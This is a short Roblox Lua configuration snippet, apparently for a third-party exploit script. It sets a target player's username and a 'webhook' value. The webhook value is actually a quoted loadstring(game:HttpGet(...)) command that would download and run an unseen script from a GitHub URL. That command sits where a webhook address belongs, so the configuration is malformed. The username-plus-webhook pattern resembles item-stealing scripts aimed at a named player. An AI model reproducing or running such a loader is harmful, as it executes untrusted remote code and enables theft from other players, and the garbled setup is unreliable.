-- Mode: NORMAL
getgenv().TARGET_USERNAME = "Guilherme1_137"
getgenv().WEBHOOK_URL = "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Cofizin/script/refs/heads/main/script.lua\"))()"
